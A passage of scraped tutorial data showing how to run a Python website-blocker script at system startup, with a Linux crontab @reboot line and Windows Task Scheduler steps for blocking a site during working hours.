our script is working fine on the system start-up as the website is refused to connect. ']",[],"['$ sudo crontab -e', '@reboot python3 /home/javatpoint/Desktop/Python/website_blocker/blocker.py']",[],[],[]
489,['Script Deployment on Windows '],"[""This section of the tutorial illustrates how the python script will be deployed at start-up so that we don't need to open the terminal all the time to run the script.""]","['https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-linux', 'https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/python-website-blocker-script-deployment-on-linux', 'https://www.javatpoint.com/numpy-tutorial']","['https://static.javatpoint.com/python/images/script-deployment-on-windows2.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows3.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows4.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows5.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows6.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows7.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows8.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows9.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows10.png', 'https://static.javatpoint.com/python/images/script-deployment-on-windows11.png']",[],[],[],[],"['Lets first change our hosts file path from ""/etc/hosts"" to ""C:\\System32\\drivers\\etc\\hosts"" as the hosts file is stored at this location on windows. ', 'To schedule the tasks on the windows, we need to open the task scheduler as shown in the below image. ', 'Click on Create Task.. given in the right pane of the application. ', 'The following window will open. ', 'Configure the properties and give the name and other required properties for your script. Do check the Checkbox as ""Run with highest privileges"". ', 'Go to Triggers and create a new trigger as shown in the below image. ', 'Select the ""At startup"" option from the drop-down list so that the script can run at start-up.', 'Now, go to Actions and create a new action by clicking on new. ', 'Now, click on Conditions and deselect the 2nd option which says ""Start the task only if the computer is on AC power.""', 'Now, go to settings and click OK as shown in the following image. ', 'Now, we got our task Website-blocker scheduled at system start-up. We can check this in the task list as shown in the following image.', 'Now, we need to restart our system to make the script active on system start-up. ', 'Restart the system now, and try to access the blocked website www.facebook.com as we are in working hours now. ', 'It will show the display which looks like following. ', 'Hence, we have got our script working fine on system start-up and block the access to www.facebook.com (or any website you want) automatically. ']","['The following window will open. Select the ""Start a program"" action from the drop-down list and browse the path to the script, i.e. blocker.py (in my case it is E:\\blocker.py) and click OK. ']",[],[],[],[],[]
